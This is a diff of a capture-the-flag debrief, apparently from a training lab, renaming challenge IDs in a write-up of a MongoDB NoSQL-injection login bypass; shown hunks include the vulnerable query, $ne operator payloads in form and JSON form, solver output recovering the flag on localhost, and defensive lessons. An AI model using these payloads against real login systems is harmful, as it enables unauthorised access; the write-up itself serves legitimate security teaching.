@@ -1,13 +1,13 @@
 # Bypassing the Archive Guardian, Debrief
 
-**Node:** `p4_2` &middot; **Flag:** `SEIYAKU{ne_null_walks_in}` &middot; **Route:** `GET/POST /p4/guardian` &middot; **Sink:** `challenges/phase4.py`, MongoDB (`agents` collection) &middot; **Signal:** the matched agent's identity, fully revealed on success, not blind, unlike p4_1
+**Node:** `p4_1` &middot; **Flag:** `SEIYAKU{ne_null_walks_in}` &middot; **Route:** `GET/POST /p4/guardian` &middot; **Sink:** `challenges/phase4.py`, MongoDB (`agents` collection) &middot; **Signal:** the matched agent's identity, fully revealed on success, not blind, unlike p4_3
 
 ## The bug, in one line
 
 `db.agents.find_one({"username": username, "password": password})`,
 where `username` and `password` are handed to MongoDB exactly as the
 request supplied them, no `isinstance(..., str)` check anywhere before
-that line. It's the same type-confusion class p4_1 already introduced
+that line. It's the same type-confusion class p4_3 already introduced
 (notes §8), moved from a read/search path onto an authentication check,
 which turns "an attacker can probe a field" into "an attacker can log
 in as someone else without any valid credential at all."
@@ -37,7 +37,7 @@ credential the Guardian's design assumed it was asking for.
 
 ## Two ways to make `username`/`password` arrive as a dict
 
-Exactly the same two channels as p4_1's `value` parameter, applied to
+Exactly the same two channels as p4_3's `value` parameter, applied to
 two independent login fields instead of one search field:
 
 1. **A JSON body.** `POST /p4/guardian` with `Content-Type:
@@ -82,7 +82,7 @@ below exercises both.
 ## The vulnerable sink
 
 ```python
-# challenges/phase4.py, p4_2
+# challenges/phase4.py, p4_1
 if username is not None and password is not None:
     db = mongo_db()
     try:
@@ -235,24 +235,24 @@ bracket-notation reconstruction involved at all here, since
 
 ### The full solver
 
-`solvers/p4_2.sh` automates all three checks above (wrong-password
+`solvers/p4_1.sh` automates all three checks above (wrong-password
 rejection, form-encoded bypass, JSON-body bypass) against the real
 running stack. A real run against this exact seed:
 
 ```
-[p4_2] target: http://localhost:18742/p4/guardian
-[p4_2] step 1, legitimate login with a wrong/guessed plain-string password
+[p4_1] target: http://localhost:18742/p4/guardian
+[p4_1] step 1, legitimate login with a wrong/guessed plain-string password
   POST username=guardian&password=totally-wrong-guess
   response: {"agent":null,"error":null,"success":false,"username":"guardian"}
   ok: wrong plain-string password was correctly rejected (no flag)
-[p4_2] step 2, form-encoded bypass: username[$ne]=1&password[$ne]=1
+[p4_1] step 2, form-encoded bypass: username[$ne]=1&password[$ne]=1
   response: {"agent":{"agentId":"AG-00","codename":"Archive Guardian","flag":"SEIYAKU{ne_null_walks_in}","privileged":true,"role":"guardian","status":"privileged","username":"guardian"},"error":null,"success":true,"username":null}
   ok: form-encoded $ne bypass logged in as the guardian, flag recovered: SEIYAKU{ne_null_walks_in}
-[p4_2] step 3, JSON-body bypass: {"username":{"$ne":null},"password":{"$ne":null}}
+[p4_1] step 3, JSON-body bypass: {"username":{"$ne":null},"password":{"$ne":null}}
   response: {"agent":{"agentId":"AG-00","codename":"Archive Guardian","flag":"SEIYAKU{ne_null_walks_in}","privileged":true,"role":"guardian","status":"privileged","username":"guardian"},"error":null,"success":true,"username":null}
   ok: JSON-body $ne bypass logged in as the guardian, flag recovered: SEIYAKU{ne_null_walks_in}
-[p4_2] ok: wrong password rejected, both bypass styles logged in as the guardian
-[p4_2] PASS
+[p4_1] ok: wrong password rejected, both bypass styles logged in as the guardian
+[p4_1] PASS
 ```
 
 ## HxH analogy
@@ -307,7 +307,7 @@ to evaluate honestly, not because you broke it.
   value a query filter could ever match against in the first place.
 - **This generalizes past MongoDB.** The same "never let attacker
   input decide *what kind of comparison* your query performs" lesson
-  from p4_1 applies again here, on a higher-stakes surface: any login
+  from p4_3 applies again here, on a higher-stakes surface: any login
   check built by handing user-controlled values straight into a
   structured query, an ORM's `.filter(**request_data)`, a GraphQL
   resolver, a NoSQL driver of any kind, has this same bug available
